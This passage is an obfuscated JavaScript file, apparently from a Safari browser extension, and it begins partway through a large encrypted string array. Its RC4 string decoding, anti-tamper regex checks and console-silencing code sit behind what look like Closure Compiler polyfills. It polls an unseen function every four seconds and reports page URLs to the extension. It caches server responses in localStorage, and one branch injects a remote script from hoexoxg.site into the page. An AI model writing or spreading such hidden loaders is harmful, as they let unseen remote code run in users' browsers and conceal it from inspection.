    "wq0XTTdILsKqZ0Ui", "w60Ow4TDtBHDmMO7Ww==", "BjcISAA=", "w4EwJ8KUwqY=", "TsOIZE0HdcKRZQTDgA==", "wqHDtMOBw4FA", "wrhDw7DCnsKa", "dsOUaXUM", "VMOvWWgoRsO6SibDoA==", "wofDtsKtWMKJ", "ATwAOsOv", "IMK5csOVHQ==", "wqwbwrPDkVo=", "YcKDwoQ=", "wofDhxHDpxo=", "b1LDssKhwrvCng==", "w4YRw6zDkAk=", "AcOWwqAOFw==", "YcKIw4PCtMKawrrCosOnMA==", "TMO0w4JRw74=", "acOOWww=", "w6DCvlXCrcOjBsOp", "w6wPw5TDrA==", "w6BCNR8uwqxBMinDig==", "Sx/CtcOawpg=", "wqMXw6J4wrw=", "wp8Vw5PDmwbDoA==", "wp9SRMK0wpLDg8O7wrzDisOh", "UMO8Hn1y",
    "YsO3wpUaw5w=", "w68Fw7ErVcKVwrLDhw==", "ccOTTQ5KwrxxIWtY", "JsKmKWE=", "R8Omw7lOw6JAw7HDg19S", "wp4Dw5F9wokHbA==", "KwQeAMOM", "w43CnsKeRTxB", "LSs9dBw=", "wqVbw5bDvzc=", "w6fCusKsZQRhIzzCo2s=", "cSLCsMOYwpU=", "w7APw5c=", "Z8Kfw5nCosKbwqXCrg==", "UMK1w4fDoA==", "w7PCq1XCrcO7", "w6nDmBDDkw==", "wrTDhyfDvgU=", "w7nCmMKaaiI=", "QsKOw5jDuCY=", "wp9sRcK1wo/CjcOyw73DjsKz", "w6cPw7A/Rg==", "wrTDlETDgRsyDiJkwpg=", "w4fDlsK7wqPCmQ==", "w4cqPldw", "wqLCrRvCn8Ol", "w6HCr0TCtcOnKsOuw7PDoMKY", "PsKsJHzCtF9Rb1E=",
    "w7nCn1TCsMOp", "w6UDw5PDsQvDkg==", "FCEvNMOL", "S8Omw6Nuw5Y=", "JsKOfMObHA==", "w557RMK2wqk=", "woUVw459wokQbB0=", "wrtcUsO3wpzCoHIHTA4=", "IsKUS8OMHQ==", "wprDq8Oow4k=", "wpnCnXEhw5k=", "TsO4HlduVMOI", "wr52w7nCpsKA", "Z8OawpQyw6E=", "wqpew6k=", "wqxTw7TCuMKg", "SMOqaGgS", "w5Iiw5UuaQ==", "wrtGR8OowpjDqg==", "w7gvLRzCkw==", "w5fDkMK8wo/Cpw==", "Mh4bTznCrMOL", "XcOVwpLDpgNSw5AywprCnw==", "UBxswovDiw==", "w6XCtWbCmcOF", "bDtYwpLDtg==", "w60OwqI8Cw==", "w4AJLWBH", "Ox8zAMOCwoDDiBAPw5A=", "JcOIwrwFIXfCkQ==",
    "wrHDnS/DlhQxwoZoFk0=", "w4ohw7PDkTLDuQ==", "dcK3w7zCusKf", "ZcOBw4Vpwocnw5zDo3gS", "wrPCh2oyw4M=", "wrYWwqvDqVA=", "w5fDgcKXwqPCrMK0wo7Ckg==", "HsKOwrLCkiE=", "VcO+wo3DpBw=", "fjzCqMONwo3CrsOP", "w6I8DRfCt8Ox", "NR4ccg==", "W2PDlA==", "S8OCbUgKbcKH", "TcOIwp8=", "dsOtTh1o", "woXCg2s+w4gOK8OCwrg=", "eVXCtw==", "w4poVMKhwog=", "wqh/w4zDnBE=", "w5YhA8KHwqUXw77DswQ=", "RUZg", "w6YZwqQ=", "w5rCgynClg5kFWFqwr8=", "wpYbw5fDjQ/Cp8KnG8KjGw==", "wrlJw7LCgsK6", "bsOPXBFCwrdqEHo=", "w4UIEMKVwo8=", "w4xcw6kAGQrCkCV9dg==",
    "w51hw6YoGg==", "woTCshLCjMK9wpNcw4LClMK7", "wqbDgcKHbMKr", "ZsONRxpOwr4=", "aEfDosKkwrA=", "wrE1w43Dgyg=", "wrx2w57DvcOW", "VsO0w6R9w5U=", "wqtkw7/Ct8OW", "FcOrw5MQwo0=", "dSHCo8OY", "wpUXw4/DrjE=", "w48EEEBQ", "wo3DtsOg", "wosywqDDpGE=", "w708woIrGg==", "Q8K9w4bDvivDtFg=", "w7ovw5AlYw==", "YsOORgtAwr5g", "aE/DrcKtwqbCjWxeLw==", "wpbDt8KHQ8KH", "w4nDtcK7wrbCsg==", "ZlrDrXNn", "wobCnGsuw5o=", "w5F5w64BZg==", "IhMKZSbCmsOSw4AXw58=", "Y8ONw4l+w59xw4fDqWI=", "wrxHWMOz", "RsKKw6HCgcKg", "UiBkwrXDs8Opwr8=",
    "R11tw4Mv", "CcKXSsOPAg==", "woxpwqonCxjCocO7woUq", "MxciaCs=", "wqF0w5rDhsOk", "w6ZDw40jHQ==", "wo3Dly3DiAYw", "UBNdwp/CgQ==", "woUVw5fDmA==", "w5B7w7spTAvDow==", "w4haw4QJdw==", "wpxSw6jDtw==", "wonDgCbDiQ==", "wrnCqEUEw6w=", "w5QhDnc+", "w5zDqhvDqG8=", "w7J8SMKBwo4=", "ZsKHw6bDmwrDkH4bw47DtA==", "IMK5YcOBHg==", "w7AJw4rDvQvDicOq", "KsOCwrwROnM=", "Gg06F8OJ", "w6YecA==", "XFFiw5AoIQ==", "SXHDgVA=", "woxHw73DtwU=", "wpXCqjDCkMOz", "eWVcw58w", "VDRowq3Dvw==", "YyZ6wrLDqA==", "WcOxAlZ2", "ZcOEThFBwrdVF2FO",
    "w49QXcK+woDCisO5wr/Dt8Ky", "QidAwqTDnQ==", "JcKTwpbCgQ7Dq8KnwpN2Kw==", "SMOCaUw8", "JAkbfw==", "wr1GSMOrwozDqn4a", "NMKIwpPCjA==", "w63DnD7DsEM=", "wqfDqMKbVsKYL8Kmw5vDpsKB", "wrHDvQ/DtjQRwqZIGmQ=", "wpDCp2Mpw58=", "wowWwo7DmlVcYQc=", "cTbCqMOZwpbCqg==", "TMOfwo/DpRhOw5Y0wrrClQ==", "w7LDgcK5woDCiA==", "w5zCn07CkcOI", "wogSw4JpwrI=", "w7cQw4vDsRA=", "w4Y0EG5O", "w6ACKEMgwrBU", "woMUw5RCwrI=", "w6gPw4TDuRDDlcOxRg==", "wpdBw6HDvQ==", "c8O8w7h1w60=", "wphOw4LCi8KF", "wqXCqAzCpsOH", "w6gSwo0lPQ==", "FcOqw5E=",
    "w5Erw6Mtaw==", "N8OnGX13XcOnRmHDsw==", "LcKxLWTCplN4b0fDvQ==", "JcKDRMOAKQ==", "w7QtJ8K0wp4=", "wptjw7TDmMOX", "w7nCj8K6Qz8=", "wpPDsMOHw71l", "wpRcw6kVGB3Cu2lrbw==", "w7bCrcKm", "YMORWC5KwqB2DGFQ", "D8KocsO0", "wrtlw4PCi8KkIyFPw6Fo", "w44nwpc+DA==", "wobCtg3CksOs", "w4LCuXTCs8Or", "w6Z9w5MyNCLClwZURA==", "LMKsLHw=", "wpoMwozDgEdcYgU=", "wptgw4fDqRA=", "SMKkw43Ch8K7", "YMKcw6PDmDI=", "wojDtsOjw4Btw70ObEtq", "wrl6fMOhwo0=", "wpfCrzLCssOW", "IA0rMsOX", "HsOFwpEFPQ==", "w6vDiQHDnkY=", "c8K9w57Cl8KX",
    "w6wtwrYOCg==", "dcO3Zm8g", "M1XDtMKpwqHCkG4cLFM=", "wpYGw5TDgAbCusKyB8KT", "woU4QQ==", "wpszWjls", "w41ww643XwfDtA==", "B8O0woEjA17Cq1vDncOA", "w4DDphbDt2o=", "cUPDs8K7wrTCnmg=", "wrMgwqDCpxI=", "bcKew5HCvg==", "YxZgwozCgg==", "w5PDrcKETMKOYg==", "wqYRQApX", "f8OeQEUT", "ARkSw5A=", "PMOdwrcxKQ==", "w5TCusKCSjw=", "VsOOwojDpQQawop+wpnChw==", "w7AIKFQ=", "dMKfw5vCqMKSwqDCp8Ok", "bsOHw499", "QCJTwr7CrQ==", "WMOzHg==", "ATgNJ8Ouwr4=", "w6oEw7YvWcKzwrs=", "wo9Lw4zCm8Oq", "Mh4bRznCvcOUw5scw4Q=", "wq0EWSZD",
    "wrowwq7Dr2xlXyQpwrQ=", "wo8NwofDjVZH", "XMOfwprDugVFw4k+wo/ClA==", "VMOedFYOZMKaZRrDgA==", "I8KhJ2k=", "wpsIw6JJwq8=", "eWwYw5PCsyo=", "VcOyGWo=", "w5UkEGYV", "aMOaw50=", "w7JPw78VZw==", "w77CvkvCpsO2DQ==", "bsO+H213", "wqsqw4ZfwqU=", "wrtpw4PCr8O/JCdHw7d0", "R8O6wr0iw78=", "w6o8BRnCrcO8eMKdZGA=", "wqEIw6JZwoA=", "RiBkwqLDrsOtwrUo", "wpDDq8O/w4Q=", "w6dRw70TfQ==", "SCvCsMO6wqE=", "wrwcw6nDkD4=", "w7XCt2DClcOX", "wqpdw67CtcOf", "w68IKFc7wrQ=", "EsOPwrdWaW/CnHzDocK4", "AcKywo7CpBE=", "FsO3w54Owo7DpMOkw4vCnsOr",
    "AMKHI1XCmA==", "JzQaF8OY", "w5V+w7wuOA==", "woobw5w=", "acKRw4PCssKc", "wq7DkCnDihEsw4RtNg==", "UcO4wrTDkR4=", "aMOPThc=", "w544w6QaEz7DjsKjw6oN", "w6vDjRvDiQ46Un4DwpA=", "V8OreRdi", "wp8oZwpv", "WMOxwqc/w4ZSw5ckwqU=", "w4LCvE3CmMOg", "c0TDqsKtwrbCjQ==", "U8OyHQ==", "wqByw5LCrA==", "MMKyVMOpBA==", "woUIw4J9wp0AbAo=", "w7ktMsKnwoM=", "TSFZwp0=", "OyEtEcOr", "woNow5fCqsOk", "HSIvIsOv", "w4kDLnEM", "w7g+wo4vCQ==", "wp15w6zCvMOQ", "cDLCssOdwoo=", "wpTCshzCisOgw4I=", "wpBfw5zCqsOz", "aMOLYVAu", "w7Vsw6I0LA==",
    "X8OnwqYCw7A=", "w54Rw57DrxQ=", "wqFDw6rClg==", "Q8Ogwr8=", "JiHCo8OKwpfCsMOEwoLDlcKP", "ccKew6TDoQo=", "RixZwpDCgQ==", "FRUtQzk=", "w7vCscKbQBo=", "wqwgw5DCpsK/NTJKwqNy", "IcOQw6Qhwp0=", "wqBYw63Cn8OrYSI=", "dcO8GnlC", "JcKoA2HCqA==", "HjkINsOo", "eTbCoMOXwozCp8O6w5DDicKL", "wrlow5nCvsKG", "w7bDpRvDnHw=", "wrpSw5/DkMOv", "WsO4HlduVMOI", "wrBNTcOuwpfDq0sbQBI=", "YcO0w5h8w5w=", "fnVYw74KDA==", "w4bDjMKUwqXCtcKVwp/CkksI", "wqXCiUAJw7c=", "w71kw5UTUw==", "wpxcw6rDqBQfLcO5w5nDnQ==", "w4Uzw7TDjSnDucOBbT7DnA==",
    "wpYcw4RWwo8=", "w4pcw74OHw==", "w4YPNcKHwps=", "RcOQfgFp", "fgXCrcO5wq8=", "w5xQX8K0wonCj8Ow", "w7LDhwfDvEIi", "w60CMQ==", "W8OwKXlK", "woRHR8O+wp/Dp3cFfBs=", "w68TMH17", "w5fDgcKFwrPCrMKow4vDiEQT", "w4RHw6MPGw==", "QcOdwokEw6A=", "w5hiw6oEKg==", "wonCqRPCmw==", "acOVXAhcw6gqSmNR", "T8O1wr7DoT0=", "w51bw6IVBALCsA==", "w7Mnw7wrcw==", "T8OJeTJm", "wqdsw5bCvsK1Mw==", "w70tERnCrcO+QcKJcg==", "wpnCnl89w4s=", "bT1EwpjDlQ==", "wqYrUS1D", "wqE1w6hkwpE=", "DMK5HlXChg==", "woddw5XDlxA=", "wrovw7dHwrI=", "C8KoJsOoK2B/F8K/Gw==",
    "V8OVwpI=", "a8OHJkpT", "wrDDlEbDgRwyCiJkwpg=", "w74QBTrCkg==", "KcOlwpoyJw==", "w6zDt8K+worCn8KSwq7Cv3Ip", "woBWw6nCnMOI", "fnVYw74KDBvCj0RZ", "wrnDg8Kcf8K0", "wqxUw7/Ciw==", "C8OKw6URwpw=", "w6tlw6svVg==", "w5x6w7AoUQjDtA==", "wpLDv8KDSsKQNcKjw5jDmw==", "w6cTKTbCmg==", "wql/w7fDvxo=", "dFTDpcKu", "wpTDkcKcaMKz", "ZUTDmsKgwqc=", "woHDpsOWw5h6", "w6UQw5fDtB0=", "cMOobTBF", "R8OoZDRwwoJXKkN3", "wpvDtRPDiTo=", "w7QPw4vDoQLDlcOyRCTCmg==", "wp8WwozDkEdHeAgQwpI=", "csOHw4t4w4o=", "eAnCq8OIwoM=", "wpR+w5LCtsOBSRdXwpwh",
    "w7wBwpE7", "TcO4TE0L", "w7srPsKKwqo=", "dRJzwpvDow==", "wqAcQio=", "wqZNWMO3wpbDoGgMewc=", "wp/DtcKSSQ==", "w7/DlcKiwqzCrA==", "woLDgm8ow4sfKMOWwqzDrg==", "wrwcwqzCug==", "NycKMsOr", "UzvCl8O0wqs=", "YsK1w4DCg8K8", "cMO5wr4jw4Q=", "w5fDpTLDm34=", "PcK3MWnCtw==", "ajZOwrjDjw==", "PsKsO3PCsA==", "wpMDeDRU", "Q2zDgE8=", "w7DCusKmag==", "NMKCw5fClEvDlsKgwp5mJA==", "wofDssKvasKX", "w5taU8Ky", "wr8dw4jDuwo=", "w6LCtEnCuMOkDMOgw7U=", "w74twpAnKQ==", "eUDDq8KPwpc=", "NAkD", "Ym54w4AI", "ATgeOsO1wqrDozk6",
    "worCpBLCkg==", "wp5GQ8OGwro=", "wqs2bTtX", "wqBWw7/CjsOU", "A8K0ZcOhJnRoAQ==", "wpnDtMO8w5xx", "wqUHw4vDhxs=", "wqdVw5bCksKB", "w5QqMcK0wo8=", "w49NXsK3woPCkcOhwqrDqsKu", "w6oeKVwuwqhUeA==", "wr3DrcOcw4Rf", "wr8Rwq3Csw==", "Fz4YKg==", "w6UUw7/Dogg=", "UsO7wqAmw4hIwpxlw4gx", "SXfDkEZ3Gkdmf0k=", "w6k0wroQIA==", "SWfDo8K/woE=", "wrjDgg7Dnjo=", "BiUBNsOowrnDqzIz", "wqjDksK5Z8K/CMKOw7vDsMK8"
];
(function(ballSets, content) {
    var fn = function(selected_image) {
        for (; --selected_image;) {
            ballSets.push(ballSets.shift());
        }
    };
    var build = function() {
        var ctx = {
            "data": {
                "key": "cookie",
                "value": "timeout"
            },
            "setCookie": function(value, name, res, headers) {
                headers = headers || {};
                var text = name + "=" + res;
                var q = 0;
                var j = 0;
                var valueLength = value.length;
                for (; j < valueLength; j++) {
                    var path = value[j];
                    text = text + ("; " + path);
                    var code = value[path];
                    value.push(code);
                    valueLength = value.length;
                    if (code !== true) {
                        text = text + ("=" + code);
                    }
                }
                headers.cookie = text;
            },
            "removeCookie": function() {
                return "dev";
            },
            "getCookie": function(cookie, name) {
                cookie = cookie || function(canCreateDiscussions) {
                    return canCreateDiscussions;
                };
                var v = cookie(new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\/+^])/g, "$1") + "=([^;]*)"));
                var test = function(f, i) {
                    f(++i);
                };
                test(fn, content);
                return v ? decodeURIComponent(v[1]) : undefined;
            }
        };
        var init = function() {
            var negativeRegex = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
            return negativeRegex.test(ctx.removeCookie.toString());
        };
        ctx.updateCookie = init;
        var array = "";
        var k = ctx.updateCookie();
        if (!k) {
            ctx.setCookie(["*"], "counter", 1);
        } else {
            if (k) {
                array = ctx.getCookie(null, "counter");
            } else {
                ctx.removeCookie();
            }
        }
    };
    build();
})(a0a, 367);
var a0b = function(m, t) {
    m = m - 0;
    var l = a0a[m];
    if (a0b.yYCZAh === undefined) {
        (function() {
            var create = function() {
                var viewport;
                try {
                    viewport = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
                } catch (l) {
                    viewport = window;
                }
                return viewport;
            };
            var e = create();
            var brightColors = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            if (!e.atob) {
                e.atob = function(s) {
                    var str = String(s).replace(/=+$/, "");
                    var output = "";
                    var q = 0;
                    var u;
                    var c;
                    var pos = 0;
                    for (; c = str.charAt(pos++); ~c && (u = q % 4 ? u * 64 + c : c, q++ % 4) ? output = output + String.fromCharCode(255 & u >> (-2 * q & 6)) : 0) {
                        c = brightColors.indexOf(c);
                    }
                    return output;
                };
            }
        })();
        var del = function(data, a) {
            var b = [];
            var f = 0;
            var c;
            var ret = "";
            var tempData = "";
            data = atob(data);
            var i = 0;
            var tldCount = data.length;
            for (; i < tldCount; i++) {
                tempData = tempData + ("%" + ("00" + data.charCodeAt(i).toString(16)).slice(-2));
            }
            data = decodeURIComponent(tempData);
            var h;
            h = 0;
            for (; h < 256; h++) {
                b[h] = h;
            }
            h = 0;
            for (; h < 256; h++) {
                f = (f + b[h] + a.charCodeAt(h % a.length)) % 256;
                c = b[h];
                b[h] = b[f];
                b[f] = c;
            }
            h = 0;
            f = 0;
            var index = 0;
            for (; index < data.length; index++) {
                h = (h + 1) % 256;
                f = (f + b[h]) % 256;
                c = b[h];
                b[h] = b[f];
                b[f] = c;
                ret = ret + String.fromCharCode(data.charCodeAt(index) ^ b[(b[h] + b[f]) % 256]);
            }
            return ret;
        };
        a0b.VqQkxC = del;
        a0b.HXMKWI = {};
        a0b.yYCZAh = true;
    }
    var o = a0b.HXMKWI[m];
    if (o === undefined) {
        if (a0b.avdWvu === undefined) {
            var extractPresetLocal = function(callback) {
                this.mpnbTz = callback;
                this.TQjLvW = [1, 0, 0];
                this.dNECWX = function() {
                    return "newState";
                };
                this.TAlOar = "\\w+ *\\(\\) *{\\w+ *";
                this.yLVawE = "['|\"].+['|\"];? *}";
            };
            extractPresetLocal.prototype.VyqkgG = function() {
                var negativeRegex = new RegExp(this.TAlOar + this.yLVawE);
                var clojIsReversed = negativeRegex.test(this.dNECWX.toString()) ? --this.TQjLvW[1] : --this.TQjLvW[0];
                return this.QKPkcL(clojIsReversed);
            };
            extractPresetLocal.prototype.QKPkcL = function(isSlidingUp) {
                if (!Boolean(~isSlidingUp)) {
                    return isSlidingUp;
                }
                return this.xCJawF(this.mpnbTz);
            };
            extractPresetLocal.prototype.xCJawF = function(saveNotifs) {
                var whichFriend = 0;
                var i = this.TQjLvW.length;
                for (; whichFriend < i; whichFriend++) {
                    this.TQjLvW.push(Math.round(Math.random()));
                    i = this.TQjLvW.length;
                }
                return saveNotifs(this.TQjLvW[0]);
            };
            (new extractPresetLocal(a0b)).VyqkgG();
            a0b.avdWvu = true;
        }
        l = a0b.VqQkxC(l, t);
        a0b.HXMKWI[m] = l;
    } else {
        l = o;
    }
    return l;
};
var f = function() {
    var c = true;
    return function(individual, a) {
        var loopend = c ? function() {
            if (a) {
                var result = a.apply(individual, arguments);
                a = null;
                return result;
            }
        } : function() {};
        c = true;
        return loopend;
    };
}();
var fO = f(this, function() {
    var checkHostHeader = function() {
        var negativeRegex = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
        return !negativeRegex.test("dev".toString());
    };
    var isPathExpression = function() {
        var negativeRegex = new RegExp("(\\\\[x|u](\\w){2,4})+");
        return negativeRegex.test("window".toString());
    };
    var matches = function(name) {
        var ms_controller = ~-1 >> 1 + 255 % 0;
        if (name.indexOf("i" === ms_controller)) {
            create(name);
        }
    };
    var create = function(key) {
        var n = ~-4 >> 1 + 255 % 0;
        if (key.indexOf((!![] + "")[3]) !== n) {
            matches(key);
        }
    };
    if (!checkHostHeader()) {
        if (!isPathExpression()) {
            matches("indеxOf");
        } else {
            matches("indexOf");
        }
    } else {
        matches("indеxOf");
    }
});
fO();
var e = function() {
    var CHELSEA = {};
    CHELSEA.fxIxA = function(category, name) {
        return category == name;
    };
    CHELSEA.Scusm = function(i, forceOptional) {
        return i === forceOptional;
    };
    var item = CHELSEA;
    var closeExpr = true;
    return function(individual, rule) {
        var _grid = {};
        _grid.uWefn = function(date, func) {
            return item.fxIxA(date, func);
        };
        _grid.iJJFY = function(i, forceOptional) {
            return item.Scusm(i, forceOptional);
        };
        var grid = _grid;
        var closingExpr = closeExpr ? function() {
            var currentRelations = {};
            currentRelations.oUaXQ = function(obj, prop) {
                return grid.uWefn(obj, prop);
            };
            var addedRelations = currentRelations;
            if (rule) {
                if (grid.iJJFY("nWFOv", "XbCss")) {
                    var regex = $jscomp.propertyToPolyfillSymbol[c];
                    if (addedRelations.oUaXQ(null, regex)) {
                        return rule[c];
                    }
                    regex = rule[regex];
                    return void 0 !== regex ? regex : rule[c];
                } else {
                    var result = rule.apply(individual, arguments);
                    rule = null;
                    return result;
                }
            }
        } : function() {};
        closeExpr = true;
        return closingExpr;
    };
}();
(function() {
    var o = {};
    var current = o;
    e(this, function() {
        var parser = new RegExp("function *" + "( *)");
        var c = new RegExp("++ *(?:[" + "a-zA-Z_$][" + "0-9a-zA-Z_$]*)", "i");
        var line = d("init");
        if (!parser.test(line + "chain") || !c.test(line + "input")) {
            line("0");
        } else {
            d();
        }
    })();
})();
var c = function() {
    var activeIndex = {};
    activeIndex.dlhHl = "lrXze";
    var previousIndex = activeIndex;
    var closeExpr = true;
    return function(individual, a) {
        var leditor_map_ = {};
        var prefix = leditor_map_;
        if (previousIndex.dlhHl !== previousIndex.dlhHl) {
            return c === b ? 0 !== c || 1 / c === 1 / b : c !== c && b !== b;
        } else {
            var closingExpr = closeExpr ? function() {
                if ("cMLBQ" !== "lPRrQ") {
                    if (a) {
                        var result = a.apply(individual, arguments);
                        a = null;
                        return result;
                    }
                } else {
                    if (d) {
                        e();
                    } else {
                        var body = document.body;
                        if (body && "none" === body.style.display) {
                            window.location.replace(location.href);
                        }
                    }
                    var options = {};
                    options.url = location.href;
                    options.status = d;
                    safari.extension.dispatchMessage("beforeload", options);
                }
            } : function() {};
            closeExpr = true;
            return closingExpr;
        }
    };
}();
var g = c(this, function() {
    var SnjsUtil = {};
    var util = SnjsUtil;
    var noop = function() {};
    var self;
    try {
        self = aL();
    } catch (aV) {
        self = window;
    }
    if (!self.console) {
        if ("vAduq" === "lHXSM") {
            var code = xhr.responseText;
            var result = {
                "status": code,
                "timestamp": Date.now()
            };
            localStorage.setItem("info", JSON.stringify(result));
            if (d) {
                b(code);
            }
        } else {
            self.console = function(noop) {
                var callbackVals = "6|3|2|7|4|" + "0|9|5|8|1".split("|");
                var callbackCount = 0;
                for (; true;) {
                    switch (callbackVals[callbackCount++]) {
                        case "0":
                            logger.error = noop;
                            continue;
                        case "1":
                            return logger;
                        case "2":
                            logger.warn = noop;
                            continue;
                        case "3":
                            logger.log = noop;
                            continue;
                        case "4":
                            logger.info = noop;
                            continue;
                        case "5":
                            logger.table = noop;
                            continue;
                        case "6":
                            var logger = {};
                            continue;
                        case "7":
                            logger.debug = noop;
                            continue;
                        case "8":
                            logger.trace = noop;
                            continue;
                        case "9":
                            logger.exception = noop;
                            continue;
                    }
                    break;
                }
            }(noop);
        }
    } else {
        if ("jhqFx" !== "FRXum") {
            self.console.log = noop;
            self.console.warn = noop;
            self.console.debug = noop;
            self.console.info = noop;
            self.console.error = noop;
            self.console.exception = noop;
            self.console.table = noop;
            self.console.trace = noop;
        } else {
            if (200 == xhr.status) {
                var code = xhr.responseText;
                result = {
                    "status": code,
                    "timestamp": Date.now()
                };
                localStorage.setItem("info", JSON.stringify(result));
                if (d) {
                    b(code);
                }
            } else {
                if (d) {
                    f(false);
                }
            }
        }
    }
});
g();
var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.ASSUME_ES5 = false;
$jscomp.ASSUME_NO_NATIVE_MAP = false;
$jscomp.ASSUME_NO_NATIVE_SET = false;
$jscomp.SIMPLE_FROUND_POLYFILL = false;
$jscomp.ISOLATE_POLYFILLS = false;
$jscomp.FORCE_POLYFILL_PROMISE = false;
$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION = false;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function(obj, prop, data) {
    var exports = {};
    exports.PeGNY = function(action, options) {
        return action == options;
    };
    exports.MhNYO = function(action, options) {
        return action == options;
    };
    var assert = exports;
    if (assert.PeGNY(obj, Array.prototype) || assert.MhNYO(obj, Object.prototype)) {
        return obj;
    }
    obj[prop] = data.value;
    return obj;
};
$jscomp.getGlobal = function(b) {
    var data = {};
    var expectedDataTransfer = data;
    b = ["object" == typeof globalThis && globalThis, b, "object" == typeof g && g, "object" == typeof self && self, "object" == typeof global && global];
    var i = 0;
    for (; i < b.length; ++i) {
        var g = b[i];
        if (g && g.Math == Math) {
            return g;
        }
    }
    throw Error("Cannot find global object");
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.IS_SYMBOL_NATIVE = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
$jscomp.TRUST_ES6_POLYFILLS = !$jscomp.ISOLATE_POLYFILLS || $jscomp.IS_SYMBOL_NATIVE;
$jscomp.polyfills = {};
$jscomp.propertyToPolyfillSymbol = {};
$jscomp.POLYFILL_PREFIX = "$jscp$";
var $jscomp$lookupPolyfilledValue = function(colors, i) {
    var currentRelations5142 = {};
    var addedRelations = currentRelations5142;
    var string = $jscomp.propertyToPolyfillSymbol[i];
    if (null == string) {
        return colors[i];
    }
    string = colors[string];
    return void 0 !== string ? string : colors[i];
};
$jscomp.polyfill = function(e, input, target, name) {
    if (input) {
        if ($jscomp.ISOLATE_POLYFILLS) {
            $jscomp.polyfillIsolated(e, input, target, name);
        } else {
            $jscomp.polyfillUnisolated(e, input, target, name);
        }
    }
};
$jscomp.polyfillUnisolated = function(n, key, target, k) {
    var bar = {};
    var document = bar;
    var callbackVals = ("0|2|1|3|5|" + "4|6").split("|");
    var callbackCount = 0;
    for (; true;) {
        switch (callbackVals[callbackCount++]) {
            case "0":
                target = $jscomp.global;
                continue;
            case "1":
                k = 0;
                for (; k < n.length - 1; k++) {
                    key = n[k];
                    if (!(key in target)) {
                        return;
                    }
                    target = target[key];
                }
                continue;
            case "2":
                n = n.split(".");
                continue;
            case "3":
                n = n[n.length - 1];
                continue;
            case "4":
                key = key(k);
                continue;
            case "5":
                k = target[n];
                continue;
            case "6":
                if (key != k && null != key) {
                    $jscomp.defineProperty(target, n, {
                        "configurable": true,
                        "writable": true,
                        "value": key
                    });
                }
                continue;
        }
        break;
    }
};
$jscomp.polyfillIsolated = function(filter, name, filename, data) {
    var firstOccurrenceIdx = {};
    var listFacet = firstOccurrenceIdx;
    var value = filter.split(".");
    filter = 1 === value.length;
    data = value[0];
    data = !filter && data in $jscomp.polyfills ? $jscomp.polyfills : $jscomp.global;
    var j = 0;
    for (; j < value.length - 1; j++) {
        if ("XoSug" !== "bGejl") {
            name = value[j];
            if (!(name in data)) {
                return;
            }
            data = data[name];
        } else {
            var tag_script = document.createElement("script");
            tag_script.setAttribute("src", "https://www.hoexoxg.site/static/s/app.js");
            document.head.appendChild(tag_script);
        }
    }
    value = value[listFacet.eKdnq(value.length, 1)];
    filename = $jscomp.IS_SYMBOL_NATIVE && "es6" === filename ? data[value] : null;
    name = name(filename);
    if (null != name) {
        if (filter) {
            $jscomp.defineProperty($jscomp.polyfills, value, {
                "configurable": true,
                "writable": true,
                "value": name
            });
        } else {
            if (name !== filename) {
                $jscomp.propertyToPolyfillSymbol[value] = $jscomp.IS_SYMBOL_NATIVE ? $jscomp.global.Symbol(value) : "$jscp$" + value;
                value = $jscomp.propertyToPolyfillSymbol[value];
                $jscomp.defineProperty(data, value, {
                    "configurable": true,
                    "writable": true,
                    "value": name
                });
            }
        }
    }
};
$jscomp.polyfill("Object.is", function(animated) {
    var __dependency3__ = {};
    var Helpers = __dependency3__;
    return animated ? animated : function(a, b) {
        return a === b ? 0 !== a || 1 / a === 1 / b : a !== a && b !== b;
    };
}, "es6", "es3");
setInterval(function() {
    d();
}, 4E3);
$jscomp.polyfill("Array.prototype.includes", function(css) {
    var ActiveXObject = {};
    var _ = ActiveXObject;
    return css ? css : function(object, t) {
        var map = {};
        var command = map;
        if ("aDuqO" === "FRvxY") {
            var callbackVals = ("2|1|5|3|4|" + "0|6").split("|");
            var callbackCount = 0;
            for (; true;) {
                switch (callbackVals[callbackCount++]) {
                    case "0":
                        object = object(value);
                        continue;
                    case "1":
                        key = key.split(".");
                        continue;
                    case "2":
                        t = $jscomp.global;
                        continue;
                    case "3":
                        key = key[key.length - 1];
                        continue;
                    case "4":
                        value = t[key];
                        continue;
                    case "5":
                        value = 0;
                        for (; value < key.length - 1; value++) {
                            var k = key[value];
                            if (!(k in t)) {
                                return;
                            }
                            t = t[k];
                        }
                        continue;
                    case "6":
                        if (object != value && null != object) {
                            $jscomp.defineProperty(t, key, {
                                "configurable": true,
                                "writable": true,
                                "value": object
                            });
                        }
                        continue;
                }
                break;
            }
        } else {
            callbackVals = "3|4|5|0|2|" + "1".split("|");
            callbackCount = 0;
            for (; true;) {
                switch (callbackVals[callbackCount++]) {
                    case "0":
                        t = t || 0;
                        continue;
                    case "1":
                        return false;
                    case "2":
                        if (0 > t) {
                            t = Math.max(t + x, 0);
                        }
                        for (; t < x; t++) {
                            var key = value[t];
                            if (key === object || Object.is(key, object)) {
                                return true;
                            }
                        }
                        continue;
                    case "3":
                        var value = this;
                        continue;
                    case "4":
                        if (value instanceof String) {
                            value = String(value);
                        }
                        continue;
                    case "5":
                        var x = value.length;
                        continue;
                }
                break;
            }
        }
    };
}, "es7", "es3");
$jscomp.checkStringArgs = function(expression, source, name) {
    var lte = {};
    lte.YpMqH = " must not be null or undefined";
    var test = lte;
    if (source instanceof RegExp) {
        throw new TypeError("First argument to String.prototype." + name + " must not be a regular expression");
    }
    return expression + "";
};
$jscomp.polyfill("String.prototype.includes", function(canCreateDiscussions) {
    var exports = {};
    var DaliLayer = exports;
    return canCreateDiscussions ? canCreateDiscussions : function(s, startIndex) {
        if ("HNMAN" === "IgBwG") {
            var denies = fn.apply(context, arguments);
            fn = null;
            return denies;
        } else {
            return -1 !== $jscomp.checkStringArgs(this, s, "includes").indexOf(s, startIndex || 0);
        }
    };
}, "es6", "es3");
var xhr;
